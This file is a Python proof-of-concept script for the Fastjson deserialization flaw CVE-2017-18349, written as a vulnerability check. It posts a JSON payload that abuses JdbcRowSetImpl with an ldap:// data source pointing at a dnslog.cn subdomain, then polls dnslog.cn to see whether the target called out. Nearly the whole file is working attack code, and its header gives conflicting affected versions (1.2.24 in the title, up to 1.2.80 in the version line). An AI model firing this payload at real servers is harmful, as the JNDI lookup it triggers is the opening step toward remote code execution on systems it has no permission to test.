#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/12 14:10
# Author     : yunkong
# FileName   : cve_2017_18349_poc.py
# Description:
#
# Exploit Title: Fastjson 1.2.24-rce漏洞（CVE-2017-18349）
# Version: fastjson 1.2.80及之前所有版本
# CVE: CVE-2017-18349

from time import sleep
from requests import session
import random
import string
import urllib3

urllib3.disable_warnings()  # 忽略https证书告警


def get_random(lens: int):
    # 定义可选的字符集
    characters = string.ascii_lowercase + string.digits

    return ''.join(random.choice(characters) for i in range(lens))


def chack_cve_2017_18349(target_url):
    # 定义session对象
    sess = session()

    # 获取dnslog生成的子域名
    response = sess.get(url="http://www.dnslog.cn/getdomain.php")
    subdns = response.text

    # 构造payload连接
    random_str = get_random(6)
    payload_data = '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s.%s",' \
                   '"autoCommit":true}}' % (random_str, subdns)
    # print(payload_data)

    # 发送payload
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type": "application/json"
    }
    proxy = {
        "http": "127.0.0.1:8080",
        "https": "127.0.0.1:8080"
    }
    try:
        sess.request(url=target_url,
                         method="POST",
                         # proxies=proxy,
                         data=payload_data,
                         headers=headers)
    except:
        print(f"[-] Target: {target_url} CVE-2017-18349 may not exist！！！")
        return False

    # 获取dnslog结果
    sleep(10)
    res = sess.request(method="GET", url="http://www.dnslog.cn/getrecords.php?t=" + subdns.split(".")[0])

    # print(res.text)
    if random_str in res.text:
        print(f"[+] Target: {target_url} CVE-2017-18349 may exist！！！")
        return True
    else:
        print(f"[-] Target: {target_url} CVE-2017-18349 may not exist！！！")
        return False


def vuln_scan_start(target_url):
    chack_cve_2017_18349(target_url)


# vuln_scan_start("http://192.168.12.130:8090")
